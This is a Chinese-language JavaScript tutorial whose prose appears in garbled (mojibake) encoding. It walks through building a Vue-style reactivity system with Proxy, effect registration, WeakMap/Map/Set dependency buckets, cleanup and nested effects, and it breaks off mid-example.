<p>ä¸‹é¢æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥ æ¥å®Œå–„å§ã€‚</p>
<h2 data-id="heading-2">02-å®Œå–„æ³¨å†Œå‡½æ•°æœºåˆ¶ï¼Œå®ç°å¯ä»¥æ³¨å†ŒåŒ¿åå‡½æ•°</h2>
<p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ³¨å†Œå‡½æ•°çš„å·¥å…·ï¼Œé€šè¿‡å®ƒæ¥è¿›è¡Œå‡½æ•°çš„æ³¨å†Œã€‚</p>
<ul>
<li>è®¾è®¡ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä¸´æ—¶å­˜å‚¨ è¦æ³¨å†Œçš„å‰¯ä½œç”¨å‡½æ•°</li>
<li>æ³¨å†Œå‡½æ•°çš„æ—¶å€™ å…ˆæŠŠè¿™ä¸ªå‡½æ•°èµ‹ç»™å…¨å±€ä¸´æ—¶å˜é‡ï¼Œç„¶åç«‹åˆ»æ‰§è¡Œ</li>
<li>ç«‹å³æ‰§è¡Œä¼šè§¦å‘ å¯¹è±¡çš„è·å–æœºåˆ¶ï¼Œç„¶åè¢«æ‹¦æˆªï¼Œæˆ‘ä»¬åœ¨æ‹¦æˆªå‡½æ•°ä¸­ åˆ¤æ–­ å…¨å±€ å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±æŠŠè¯¥å˜é‡ä¿å­˜åˆ°æ¡¶é‡Œã€‚</li>
</ul>
<blockquote>
<p>å®ƒæ˜¯æ€ä¹ˆçŸ¥é“éœ€è¦ç›‘å¬è°çš„å‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ï¼šå’±ä»¬å…ˆæ‰§è¡Œä¸€éï¼Œçœ‹çœ‹å®ƒä¼šè§¦å‘è°çš„æ‹¦æˆªï¼Œç„¶åå†è§¦å‘æ‹¦æˆªé‚£é‡Œï¼ŒæŠŠåˆšåˆšæ‰§è¡Œçš„å‡½æ•°ï¼Œå­˜æ”¾åˆ°åˆé€‚çš„æ¡¶é‡Œå°±å¯ä»¥äº†</p>
</blockquote>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//åŸå§‹æ•°æ®</span>
<span class="hljs-keyword">const</span> data = {<span class="hljs-attr">text</span>:<span class="hljs-string">"hello world"</span>}
<span class="hljs-comment">//å­˜å‚¨å‰¯ä½œç”¨çš„æ¡¶</span>
<span class="hljs-keyword">const</span> bucket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
<span class="hljs-comment">//å…¨å±€å˜é‡å­˜å‚¨ ä¸´æ—¶å­˜å‚¨ éœ€è¦æ³¨å†Œçš„å‡½æ•°</span>
<span class="hljs-keyword">let</span> activeEffect;
<span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">registerEffect</span>=(<span class="hljs-params">fn</span>)=&gt;{
   <span class="hljs-keyword">if</span> (!fn) <span class="hljs-keyword">return</span> ;
   <span class="hljs-comment">//æŠŠæ³¨å†Œå‡½æ•°äº¤ç»™å…¨å±€å˜é‡</span>
   activeEffect = fn;
   <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
   <span class="hljs-title function_">fn</span>()
}
<span class="hljs-comment">//å¯¹åŸå§‹æ•°æ®è¿›è¡Œä»£ç†</span>
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(data,{
   <span class="hljs-comment">//å¯¹è¯»å–æ“ä½œè¿›è¡Œæ‹¦æˆª</span>
   <span class="hljs-title function_">get</span>(<span class="hljs-params">target,key</span>){
      <span class="hljs-comment">//å°†å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ¡¶é‡Œ</span>
           <span class="hljs-keyword">if</span>(activeEffect){
                 bucket.<span class="hljs-title function_">add</span>(activeEffect)
           }
      <span class="hljs-keyword">return</span> target[key]
   },
   <span class="hljs-comment">//å¯¹è®¾ç½®æ“ä½œè¿›è¡Œæ‹¦æˆª</span>
   <span class="hljs-title function_">set</span>(<span class="hljs-params">target,key,value</span>){
      <span class="hljs-comment">//è®¾ç½®æ“ä½œ</span>
      target[key] = value
      <span class="hljs-comment">//æŠŠå‰¯ä½œç”¨å‡½æ•°ä»æ¡¶é‡Œå–å‡ºæ¥ å¹¶è¿›è¡Œæ‰§è¡Œ</span>
      bucket.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span>=&gt;</span><span class="hljs-title function_">fn</span>())
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
   }
})
<span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
   <span class="hljs-comment">//è¿™é‡Œéœ€è¦ä½¿ç”¨ ä»£ç†çš„å¯¹è±¡</span>
   <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerText</span> = obj.<span class="hljs-property">text</span>;
})
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
   <span class="hljs-comment">//è®¾ç½®çš„æ—¶å€™ ä¹Ÿæ˜¯ä½¿ç”¨ä»£ç†å¯¹è±¡ æ‰èƒ½æ­£ç¡®çš„è§¦å‘</span>
   obj.<span class="hljs-property">text</span> = <span class="hljs-string">"hello ä½ å¥½"</span>
},<span class="hljs-number">1000</span>)
</code></pre>
<p>æˆ‘ä»¬æ”¹è¿›äº†å‡½æ•°æ³¨å†Œæœºåˆ¶ï¼Œ ç°åœ¨æˆ‘ä»¬é€šè¿‡activeEffectå’Œ effect çš„æ­é…ä½¿ç”¨ï¼Œå¯ä»¥å®ç°ç›´æ¥æ³¨å†ŒåŒ¿åå‡½æ•°ï¼Œè€Œä¸åœ¨å…³æ³¨å‡½æ•°çš„å…·ä½“åç§°ã€‚</p>
<h2 data-id="heading-3">03-å®Œå–„æ³¨å†Œå‡½æ•°çš„æ¡¶ï¼Œå®ç°åŸºäºå±æ€§çš„ç›‘å¬è°ƒç”¨</h2>
<p>æˆ‘ä»¬è™½ç„¶å®ç°äº†å¯ä»¥æ³¨å†ŒåŒ¿åå‡½æ•°çš„æ³¨å†Œæœºåˆ¶ï¼Œä½†æ˜¯å½“æˆ‘ä»¬ç›‘å¬çš„å±æ€§æ˜¯a ,ä½†æ˜¯æˆ‘ä»¬æ‰§è¡Œä¿®æ”¹çš„æ˜¯bçš„æ—¶å€™ï¼ŒåŒæ ·ä¼šè°ƒç”¨å‰¯ä½œç”¨å‡½æ•°ï¼Œè¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œé‚£æˆ‘ä»¬åº”è¯¥å¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ</p>
<p>å®é™…ä¸Šæˆ‘ä»¬ç›‘å¬çš„æ˜¯è°å‘¢ ï¼Ÿ æ˜¯ä¸æ˜¯ç›®æ ‡å¯¹è±¡ï¼Ÿæˆ‘ä»¬çš„æ‰§è¡Œå‡½æ•°å’Œè°æŒ‚é’©å‘¢ï¼Ÿç›®æ ‡å¯¹è±¡çš„ç›®æ ‡å±æ€§ã€‚æ‰€ä»¥ å®ƒçš„å…³å¿ƒåº”è¯¥æ˜¯è¿™æ ·çš„</p>
<pre><code class="hljs language-css" lang="css">|<span class="hljs-attr">--target</span>
|--|<span class="hljs-attr">--key</span>
|--|--|<span class="hljs-attr">--effectFn</span>
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªæ¡¶æŠ½å–å‡ºæ¥ï¼Œåšæˆä¸€ä¸ªå…¨å±€çš„æ•°æ®å­˜åœ¨ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//å­˜å‚¨å…¨å±€çš„æ¡¶</span>
<span class="hljs-comment">/**
|--target 
|--|--key
|--|--|--effectFn
 */</span>
const bucket = new <span class="hljs-built_in">WeakMap</span>()
<span class="hljs-comment">//åŸå§‹æ•°æ®</span>
const data = {text:<span class="hljs-string">"hello world"</span>}
<span class="hljs-comment">//ç”¨ä¸€ä¸ªå…¨å±€å˜é‡  æ¥ä¸´æ—¶ä¿å­˜ æ³¨å†Œå‡½æ•°</span>
let activeEffect ;
function <span class="hljs-built_in">effect</span>(fn){
    activeEffect = fn;
    <span class="hljs-built_in">fn</span>()
}
<span class="hljs-comment">//é‡å†™æ‹¦æˆªçš„é€»è¾‘</span>
const obj = new <span class="hljs-built_in">Proxy</span>(data,{
    //æ‹¦æˆªè¯»å–çš„æ“ä½œ
    get(target,key){
        <span class="hljs-comment">//00 - åˆ¤æ–­activeEffectæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ ç›´æ¥è¿”å›</span>
        <span class="hljs-built_in">if</span>(!activeEffect) return 
        <span class="hljs-comment">//01- æ ¹æ®ç›®æ ‡å¯¹è±¡è·å– å¯¹åº”çš„ key--&gt;effects</span>
        let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
        <span class="hljs-comment">//å¦‚æœä¸å­˜åœ¨ å°±åˆ›å»º</span>
        <span class="hljs-built_in">if</span>(!depsMap){
            depsMap = new <span class="hljs-built_in">Map</span>()
            bucket<span class="hljs-selector-class">.set</span>(target,depsMap)
        }
        <span class="hljs-comment">//02-æ ¹æ®å±æ€§è·å– å¯¹åº”çš„ å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ— å®ƒæ˜¯ä¸€ä¸ªSet</span>
        let deps = depsMap<span class="hljs-selector-class">.get</span>(key)
        <span class="hljs-built_in">if</span>(!deps){
            deps = new <span class="hljs-built_in">Set</span>()
            depsMap<span class="hljs-selector-class">.set</span>(key,deps)
        }
        <span class="hljs-comment">//03- æŠŠå‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ‹¿åˆ°çš„seté˜Ÿåˆ—é‡Œé¢</span>
        deps<span class="hljs-selector-class">.add</span>(activeEffect)
        <span class="hljs-comment">//è¿”å›å±æ€§çš„å€¼</span>
        return target<span class="hljs-selector-attr">[key]</span>
    },
    <span class="hljs-comment">//æ‹¦æˆªè®¾ç½®çš„æ“ä½œ</span>
    <span class="hljs-built_in">set</span>(target,key,newValue){
        <span class="hljs-comment">//è®¾ç½®å±æ€§å€¼</span>
        target<span class="hljs-selector-attr">[key]</span> = newValue
        <span class="hljs-comment">//æ ¹æ®targetæ‹¿åˆ°å¯¹åº”çš„æ¡¶ è¿›è¡Œæ‰§è¡Œ</span>
        let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
        <span class="hljs-built_in">if</span>(!depsMap) return ;
        <span class="hljs-comment">//æ‹¿åˆ°å±æ€§å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ—</span>
       const effects = depsMap<span class="hljs-selector-class">.get</span>(key)
       <span class="hljs-comment">//åˆ¤ç½šæ˜¯å¦å­˜åœ¨ å¹¶æŒ‰ä¸ªæ‰§è¡Œ</span>
       effects &amp;&amp; effects<span class="hljs-selector-class">.forEach</span>(fn=&gt;fn());
    },
})
</code></pre>
<p>æ„å»ºçš„æ•°æ®ç»“æ„ï¼Œåˆ†åˆ«ä½¿ç”¨äº†<code>weakMap,map,set</code></p>
<ul>
<li><code>weakMap</code>ç”± <code>target</code>--&gt;<code>Map </code>æ„æˆ</li>
<li><code>Map</code>ç”± <code>key</code>--<code>Set</code>æ„æˆ</li>
</ul>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™é‡Œä½¿ç”¨äº†weakMapå’ŒMap ï¼Œä¸ºä»€ä¹ˆè¿™é‡Œä½¿ç”¨weakMap è€Œä¸æ˜¯Mapå‘¢ï¼Ÿ</p>
<h3 data-id="heading-4">WeakMap çš„ä½¿ç”¨è¯´æ˜</h3>
<p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ä»–ä»¬ä¸¤ä¸ªçš„åŒºåˆ«å§ï¼š</p>
<ul>
<li>
<p>é¦–å…ˆï¼Œ<code>WeakMap</code>åªæ¥å—å¯¹è±¡ä½œä¸ºé”®åï¼ˆ<code>null</code>é™¤å¤–ï¼‰ï¼Œä¸æ¥å—å…¶ä»–ç±»å‹çš„å€¼ä½œä¸ºé”®åã€‚</p>
</li>
<li>
<p>å…¶æ¬¡ï¼Œ<code>WeakMap</code>çš„é”®åæ‰€æŒ‡å‘çš„å¯¹è±¡ï¼Œä¸è®¡å…¥åƒåœ¾å›æ”¶æœºåˆ¶ã€‚</p>
</li>
<li>
<p>å®ƒçš„é”®åæ‰€å¼•ç”¨çš„å¯¹è±¡éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œå³åƒåœ¾å›æ”¶æœºåˆ¶ä¸å°†è¯¥å¼•ç”¨è€ƒè™‘åœ¨å†…</p>
</li>
</ul>
<p><code>WeakMap</code> çš„é”®ååªèƒ½ä½¿ç”¨å¯¹è±¡ï¼Œè€Œå®ƒå¼•ç”¨çš„å¯¹è±¡åˆä¸ä¼šè®¡å…¥åˆ°åƒåœ¾å›æ”¶æœºåˆ¶é‡Œé¢ï¼Œé‚£ä¹ˆå®ƒçš„ä½œç”¨å°±æ˜¯ä¸¤ä¸ªæ–¹é¢ã€‚</p>
<ul>
<li>ä¸€ã€å¦‚æœweakMapçš„å¼•ç”¨çš„å¯¹è±¡è¢«å…¶ä»–å¯¹è±¡å¼•ç”¨ï¼Œé‚£ä¹ˆå®ƒå±äºå¼ºå¼•ç”¨ï¼Œåƒåœ¾å›æ”¶æœºåˆ¶ä¸ä¼šè§¦å‘</li>
<li>äºŒã€å¦‚æœweakMapçš„å¼•ç”¨çš„å¯¹è±¡å·²ç»æ²¡æœ‰å…¶ä»–çš„å¼•ç”¨äº†ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå·²ç»ä¸è¢«ä»»ä½•ä¸œè¥¿å¼ºå…³è”ï¼Œé‚£ä¹ˆåƒåœ¾å›æ”¶æœºåˆ¶å°±å¯ä»¥æ­£å¸¸çš„è§¦å‘äº†ã€‚</li>
</ul>
<p>æ‰€ä»¥weakMapç»å¸¸ç”¨äºå­˜å‚¨é‚£äº›åªæœ‰å½“keyæ‰€å¼•ç”¨çš„å¯¹è±¡å­˜åœ¨æ—¶(æ²¡æœ‰è¢«å›æ”¶)æ‰æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p>
<h2 data-id="heading-5">04-åˆ†æ”¯åˆ‡æ¢ä¸cleanup</h2>
<p>è§‚å¯Ÿä¸‹é¢çš„ä»£ç ï¼Œå®ƒçš„æ‰§è¡Œé€»è¾‘åˆ†ä¸¤ç§æƒ…å†µï¼š</p>
<ul>
<li>obj.okä¸º true , è·å–obj.textçš„å±æ€§ ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¼šè§¦å‘ä¸¤æ¬¡ä»£ç†å¯¹è±¡çš„getå¯¹è±¡ï¼Œåˆ†åˆ«ä¸º okå’Œtext ä¸¤ä¸ªå±æ€§æ·»åŠ å‰¯ä½œç”¨å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯å‰¯ä½œç”¨å‡½æ•°ä¼šä¾èµ–ä¸¤ä¸ªå±æ€§æ‰§è¡Œ</li>
<li>obj.okä¸ºfalseçš„æ—¶å€™ï¼Œåªä¼šæ·»åŠ ä¸€æ¬¡ï¼Œå‰¯ä½œç”¨å‡½æ•°ä¾èµ–ä¸€ä¸ªå‡½æ•°ã€‚</li>
</ul>

<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//åŸå§‹æ•°æ®</span>
<span class="hljs-keyword">const</span> data = {<span class="hljs-attr">text</span>:<span class="hljs-string">"hello world"</span>,<span class="hljs-attr">ok</span>:<span class="hljs-literal">true</span>}
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>()

<span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerText</span> = obj.<span class="hljs-property">ok</span> ? obj.<span class="hljs-property">text</span> :<span class="hljs-string">'not'</span>
})
</code></pre>
<p>å‡å¦‚æˆ‘ä»¬çš„ä»£ç æ˜¯è¿™æ ·æ‰§è¡Œçš„ï¼Œæˆ‘ä»¬è®¾ç½®</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">obj.ok</span> = <span class="hljs-literal">false</span>
</code></pre>
<p>å®ƒçš„æ‰§è¡Œè¿‡ç¨‹æ˜¯è¿™æ ·ï¼š</p>
<ul>
<li>é¦–å…ˆä¼šé»˜è®¤æ‰§è¡Œï¼Œåœ¨æ³¨å†Œå‡½æ•°ä¸­è§¦å‘äº†ä¸¤æ¬¡è·å–ä»£ç†å¯¹è±¡çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±åœ¨è¿™ä¸ªä»£ç†å¯¹è±¡çš„ä¸¤ä¸ªå±æ€§ä¸‹é¢åˆ†åˆ«æ·»åŠ äº†å¯¹åº”çš„ç›‘å¬å‡½æ•°</li>
<li>æ¥ç€æˆ‘ä»¬è®¾ç½®äº† obj.ok= false</li>
<li>å½“æˆ‘ä»¬è®¾ç½®äº†è¿™ä¸ªä»¥åï¼Œæˆ‘ä»¬è§¦å‘äº†obj.okä¸‹é¢çš„ç›‘å¬å‡½æ•°ï¼Œç›‘å¬å‡½æ•°å°±ä¼šæ‰§è¡Œ</li>
</ul>
<p><code>document.body.innerText = obj.ok ? obj.text :'not'</code></p>
<ul>
<li>ç”±äºobj.okæ˜¯false æ‰€ä»¥ è¿™ä¸€æ¬¡ä¸æ˜¯ç»™ä¸¤ä¸ªå±æ€§æ·»åŠ ç›‘å¬å‡½æ•°ï¼Œè€Œæ˜¯åªç»™obj.okæ·»åŠ ã€‚</li>
</ul>
<p>ä½†æ˜¯ç”±äºæˆ‘ä»¬ ä¹‹å‰çš„ç›‘å¬å‡½æ•°è¿˜åœ¨ ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¡æ—¶åªéœ€è¦è§¦å‘ä¸€æ¬¡ obj.okç­‰äºfalseçš„ç›‘å¬å‡½æ•°</p>
<p>è¿˜æ˜¯ä¼šè§¦å‘ä¸¤æ¬¡ ï¼Œä¸€æ¬¡æ˜¯æ—§çš„ã€‚</p>
<p><strong>è¿™ä¸ªé—®é¢˜å°±æ˜¯åˆ†æ”¯</strong>ï¼è§£å†³åŠæ³•å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨æ·»åŠ ç›‘å¬å‡½æ•°ä¹‹å‰ ï¼Œå…ˆæŠŠæ—§çš„æ¸…ç©ºæ‰å°±å¯ä»¥äº†ã€‚</p>
<blockquote>
<p>å¦‚æœæŒ‰ç…§æˆ‘çš„æƒ³æ³• å°±ä¼šæƒ³åˆ° æˆ‘åœ¨å†æ¬¡è®°å½•å‰¯ä½œç”¨ä¹‹å‰æ¸…é™¤æ—§çš„ä¾èµ–ï¼Œå°±éœ€è¦æŒ¨ä¸ªéå†ï¼Œä½†æ˜¯æŒ¨ä¸ªéå†ä¹Ÿæ˜¯æˆæœ¬ï¼</p>
</blockquote>
<ul>
<li>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦çŸ¥é“ï¼Œéƒ½æœ‰è°ä¿å­˜äº†å½“å‰çš„å‰¯ä½œç”¨çš„ä¾èµ–ï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™äº›ä¾èµ–éƒ½å»æ‰ï¼Œè¿™é‡Œç›´æ¥åœ¨å½“å‰å‰¯ä½œç”¨å‡½æ•°ä¸Šé¢åŠ å·¥ä¸€å±‚ï¼Œä¿å­˜åœ¨ç›¸å…³è”çš„å‰¯ä½œç”¨å‡½æ•°ä¸Šé¢</li>
<li>åœ¨æˆ‘ä»¬æ³¨å†Œå‡½æ•°ä¹‹å‰ï¼ŒæŠŠä¹‹å‰çš„ä¾èµ–éƒ½æ¸…æ‰ã€‚</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//åŸå§‹æ•°æ®</span>
const data = {text:<span class="hljs-string">"hello world"</span>,ok:true}

<span class="hljs-comment">//æ¸…ç†æ—§çš„å‰¯ä½œç”¨å‡½æ•°</span>
const cleanup =(effectFn)=&gt;{
    <span class="hljs-comment">//éå†effectFn.depsæ•°ç»„</span>
   <span class="hljs-built_in">for</span>(const deps of effectFn.deps){
      <span class="hljs-comment">//è¿™é‡Œçš„depså®é™…ä¸Šæ˜¯set---è¿™é‡Œåˆ é™¤çš„å®é™…ä¸Šæ˜¯å®ƒè‡ªå·± å…¶ä»–çš„å‰¯ä½œç”¨å‡½æ•°æ²¡æœ‰åˆ é™¤</span>
      deps<span class="hljs-selector-class">.delete</span>(effectFn)
   }
    <span class="hljs-comment">//é‡ç½®effectFn.depsæ•°ç»„</span>
   effectFn<span class="hljs-selector-class">.deps</span><span class="hljs-selector-class">.length</span> = <span class="hljs-number">0</span>
}

<span class="hljs-comment">//å­˜å‚¨å‰¯ä½œç”¨çš„æ¡¶</span>
const bucket = new <span class="hljs-built_in">WeakMap</span>()
<span class="hljs-comment">//å…¨å±€å˜é‡å­˜å‚¨ ä¸´æ—¶å­˜å‚¨ éœ€è¦æ³¨å†Œçš„å‡½æ•°</span>
let activeEffect;
<span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
const registerEffect=(fn)=&gt;{
    if (!fn) return ;
    const effectFn=()=&gt;{
      <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
      <span class="hljs-built_in">cleanup</span>(effectFn)
      <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
      activeEffect = effectFn;
      <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
      <span class="hljs-built_in">fn</span>()
    }
   <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
   effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
    <span class="hljs-comment">//æ‰§è¡Œè¯¥å‡½æ•°</span>
   <span class="hljs-built_in">effectFn</span>()
}
<span class="hljs-comment">//å®Œæˆtarget--&gt;key--&gt;effect çš„å…³è”æ³¨å†Œ</span>
<span class="hljs-comment">//åœ¨getå‡½æ•°ä¸­è¿½è¸ªå±æ€§çš„å˜åŒ–</span>
const track=(target,key)=&gt;{
   <span class="hljs-comment">//00 - åˆ¤æ–­activeEffectæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ ç›´æ¥è¿”å›</span>
   <span class="hljs-built_in">if</span>(!activeEffect) return
   <span class="hljs-comment">//01- æ ¹æ®ç›®æ ‡å¯¹è±¡è·å– å¯¹åº”çš„ key--&gt;effects</span>
   let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
   <span class="hljs-comment">//å¦‚æœä¸å­˜åœ¨ å°±åˆ›å»º</span>
   <span class="hljs-built_in">if</span>(!depsMap){
      depsMap = new <span class="hljs-built_in">Map</span>()
      bucket<span class="hljs-selector-class">.set</span>(target,depsMap)
   }
   <span class="hljs-comment">//02-æ ¹æ®å±æ€§è·å– å¯¹åº”çš„ å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ— å®ƒæ˜¯ä¸€ä¸ªSet</span>
   let deps = depsMap<span class="hljs-selector-class">.get</span>(key)
   <span class="hljs-built_in">if</span>(!deps){
      deps = new <span class="hljs-built_in">Set</span>()
      depsMap<span class="hljs-selector-class">.set</span>(key,deps)
   }
   <span class="hljs-comment">//03- æŠŠå‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ‹¿åˆ°çš„seté˜Ÿåˆ—é‡Œé¢</span>
   deps<span class="hljs-selector-class">.add</span>(activeEffect)
   <span class="hljs-comment">//04- add-- depså°±æ˜¯ä¸€ä¸ªä¸å½“å‰å‰¯ä½œç”¨å‡½æ•°å­˜åœ¨å…³è”å…³ç³»çš„é›†åˆ</span>
   activeEffect<span class="hljs-selector-class">.deps</span><span class="hljs-selector-class">.push</span>(deps)
}
<span class="hljs-comment">//åœ¨setå‡½æ•°ä¸­è¿½è¸ªå±æ€§çš„å˜åŒ–</span>
const trigger=(target,key)=&gt;{
   <span class="hljs-comment">//æ ¹æ®targetæ‹¿åˆ°å¯¹åº”çš„æ¡¶ è¿›è¡Œæ‰§è¡Œ</span>
   let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
   <span class="hljs-built_in">if</span>(!depsMap) return ;
   <span class="hljs-comment">//æ‹¿åˆ°å±æ€§å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ—</span>
   const effects = depsMap<span class="hljs-selector-class">.get</span>(key)
   <span class="hljs-comment">//åˆ¤ç½šæ˜¯å¦å­˜åœ¨ å¹¶æŒ‰ä¸ªæ‰§è¡Œ</span>
   <span class="hljs-comment">// effects &amp;&amp; effects.forEach(fn=&gt;fn());</span>

   <span class="hljs-comment">//ä½¿ç”¨ä¸€ä¸ªæ–°çš„setæ–¹æ³• é¿å…æ— é™å¾ªç¯æ‰§è¡Œ</span>
   const effectToRun = new <span class="hljs-built_in">Set</span>(effects)
   effectToRun<span class="hljs-selector-class">.forEach</span>(fn=&gt;fn());
}

<span class="hljs-comment">//é‡å†™æ‹¦æˆªçš„é€»è¾‘</span>
const obj = new <span class="hljs-built_in">Proxy</span>(data,{
   //æ‹¦æˆªè¯»å–çš„æ“ä½œ
   get(target,key){
      <span class="hljs-built_in">track</span>(target,key)
      <span class="hljs-comment">//è¿”å›å±æ€§çš„å€¼</span>
      return target<span class="hljs-selector-attr">[key]</span>
   },
   <span class="hljs-comment">//æ‹¦æˆªè®¾ç½®çš„æ“ä½œ</span>
   <span class="hljs-built_in">set</span>(target,key,newValue){
      <span class="hljs-comment">//è®¾ç½®å±æ€§å€¼</span>
      target<span class="hljs-selector-attr">[key]</span> = newValue
      <span class="hljs-built_in">trigger</span>(target,key)
   },
})

<span class="hljs-built_in">registerEffect</span>(()=&gt;{
   console<span class="hljs-selector-class">.log</span>("æ‰§è¡Œäº†å‡ æ¬¡")
   <span class="hljs-comment">//è¿™é‡Œéœ€è¦ä½¿ç”¨ ä»£ç†çš„å¯¹è±¡</span>
   document<span class="hljs-selector-class">.body</span><span class="hljs-selector-class">.innerText</span> = obj<span class="hljs-selector-class">.ok</span> ? obj<span class="hljs-selector-class">.text</span>:<span class="hljs-string">'not'</span>
})
<span class="hljs-built_in">setTimeout</span>(()=&gt;{
   <span class="hljs-comment">//è®¾ç½®çš„æ—¶å€™ ä¹Ÿæ˜¯ä½¿ç”¨ä»£ç†å¯¹è±¡ æ‰èƒ½æ­£ç¡®çš„è§¦å‘</span>
   obj<span class="hljs-selector-class">.ok</span> = false
},<span class="hljs-number">1000</span>)
</code></pre>
<h3 data-id="heading-6">set çš„æ— é™å¾ªç¯</h3>
<p>å¦‚æœæˆ‘ä»¬åœ¨ä¸€æ¬¡setçš„å¾ªç¯éå†é‡Œé¢æ—¢åˆ é™¤ï¼Œåˆæ·»åŠ åŒä¸€ä¸ªå…ƒç´ ï¼Œå°±ä¼šé€ æˆsetçš„æ— é™å¾ªç¯éå†ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨trggerå‡½æ•°ä¸­ï¼Œä¿®æ”¹äº†ä¸€ä¸‹çš„ä»£ç </p>
<pre><code class="hljs language-ini" lang="ini">   //åˆ¤ç½šæ˜¯å¦å­˜åœ¨ å¹¶æŒ‰ä¸ªæ‰§è¡Œ
   // effects &amp;&amp; effects.forEach(<span class="hljs-attr">fn</span>=&gt;fn())<span class="hljs-comment">;</span>

   //ä½¿ç”¨ä¸€ä¸ªæ–°çš„setæ–¹æ³• é¿å…æ— é™å¾ªç¯æ‰§è¡Œ
   const <span class="hljs-attr">effectToRun</span> = new Set(effects)
   effectToRun.forEach(<span class="hljs-attr">fn</span>=&gt;fn())<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-7">05-åµŒå¥—çš„effectä¸effectæ ˆ</h2>
<p>å¦‚æœæˆ‘ä»¬çš„å‡½æ•°å‘ç”Ÿäº†åµŒå¥— ï¼Œèƒ½ä¸èƒ½æ­£å¸¸æ‰§è¡Œå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">data</span> = {bar:<span class="hljs-literal">true</span>,foo:<span class="hljs-literal">true</span>}
const <span class="hljs-attr">obj</span> = new Proxy()
registerEffect(()=&gt;{
   console.log("effectFn1 æ‰§è¡Œ")
   registerEffect(()=&gt;{
      console.log("effectFn2 æ‰§è¡Œ")
      <span class="hljs-attr">temp2</span> = obj.bar
   })
   <span class="hljs-attr">temp1</span> = obj.foo
})
<span class="hljs-attr">obj.bar</span> = <span class="hljs-literal">false</span>
</code></pre>
<p>æŒ‰ç…§æˆ‘ä»¬çš„ç†è§£ å®ƒä¼šå»ºç«‹å¦‚ä¸‹çš„å“åº”å¼ç»“æ„å…³ç³»</p>
<pre><code class="hljs language-css" lang="css">obj
|<span class="hljs-attr">--bar</span>
